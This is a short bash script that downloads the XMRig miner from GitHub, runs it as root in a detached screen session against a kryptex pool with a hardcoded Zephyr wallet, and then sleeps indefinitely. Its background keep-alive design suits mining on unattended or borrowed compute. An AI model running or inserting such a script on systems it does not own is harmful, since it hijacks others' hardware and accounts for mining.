#!/bin/bash

curl https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz -L -O -J
tar -xf xmrig-6.20.0-linux-x64.tar.gz
cd ./xmrig-6.20.0
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o zeph-eu.kryptex.network:7030 -u ZEPHs8jyUPSQoopYn8BM7Dcs76qajS9XHQ9GeR5CALDyadtXWdeiFP56qPntU8BnpR8gYBsNrMkfLB5Vko8XXGg57jDT8sEmy6J.luxy -p x --randomx-1gb-pages
sleep 9999999999
